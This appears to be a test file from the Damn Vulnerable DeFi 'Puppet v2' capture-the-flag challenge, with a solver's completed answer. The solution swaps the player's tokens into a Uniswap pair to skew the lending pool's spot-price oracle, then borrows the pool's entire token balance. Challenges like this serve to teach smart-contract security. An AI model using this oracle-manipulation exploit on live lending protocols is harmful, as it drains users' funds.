const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
            
        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {
      /** CODE YOUR SOLUTION HERE */
      // Helper function to get current token/eth balances
      const logBalances = async (address, name) => {
        const wethBal = await weth.balanceOf(address);
        const tokenBal = await token.balanceOf(address);

        console.log(`${name} WETH:`, ethers.utils.formatEther(wethBal));
        console.log(`${name} DVT:`, ethers.utils.formatEther(tokenBal));
        console.log("")
      }
      const attackPool = lendingPool.connect(player);
      const attackToken = token.connect(player);
      const attackWeth = weth.connect(player);
      const attackUniSwap = uniswapExchange.connect(player);

      console.log("Pre-attack balances")
      await logBalances(player.address, "player");
      await logBalances(attackUniSwap.address, "uniswap");
      
      // Start with no weth so need to deposit eth to get some
      const ethBalance = await ethers.provider.getBalance(player.address);
      console.log("eth balance", ethers.utils.formatEther(ethBalance))
      await attackWeth.deposit({value: ethers.utils.parseEther("19.7")});
      await logBalances(player.address, "player"); // Got Weth to work wiht

      await attackWeth.approve(uniswapRouter.address, await attackWeth.balanceOf(player.address));
      await attackToken.approve(uniswapRouter.address, await attackToken.balanceOf(player.address));

      console.log('wethRequired for full pool', ethers.utils.formatEther(await attackPool.calculateDepositOfWETHRequired(await token.balanceOf(attackPool.address))));
      const playerDVTBal = await attackToken.balanceOf(player.address);
      console.log({playerDVTBal, formatted: ethers.utils.formatUnits(playerDVTBal.toString(), 18)})
      const amountOut = await uniswapRouter.getAmountsOut(playerDVTBal, [attackToken.address, attackWeth.address]);
      const amountOutMin = amountOut[1];
      // const val = await attackUniSwap.getAmountOut(playerDVTBal, reservesWeth, reservesDVT);
      console.log({amountOut, amountOutMin})
      const tokenIn = attackToken.address;
      const tokenOut = attackWeth.address;
      const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // Use the current timestamp + 20 minutes as the deadline for the transaction
      const path = [tokenIn, tokenOut];
      const tx = await uniswapRouter.connect(player).swapExactTokensForTokens(
        playerDVTBal,
        0,
        path,
        player.address,
        deadline,
        {
          gasLimit: 1e7,
        }
      );

      console.log({tx})
      await tx.wait();
      
      // We have tossed all our dvt into pool, check where we stand
      console.log("Pool has been corrupted, check it out")
      await logBalances(player.address, "player");
      await logBalances(attackUniSwap.address, "uniswap");
      const wethRequired = ethers.utils.formatEther(await attackPool.calculateDepositOfWETHRequired(await token.balanceOf(attackPool.address)))
      console.log('wethRequired for full pool now?', wethRequired);
      // approve pool before borrow
      await attackWeth.approve(attackPool.address, await attackWeth.balanceOf(player.address));
      await attackToken.approve(attackPool.address, await attackToken.balanceOf(player.address));

      await attackPool.borrow(await token.balanceOf(attackPool.address), {
        gasLimit: 1e7,
      });
      console.log("pool hacked?")
      await logBalances(player.address, "player");
      await logBalances(attackUniSwap.address, "uniswap");
      await logBalances(attackPool.address, "pool");
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});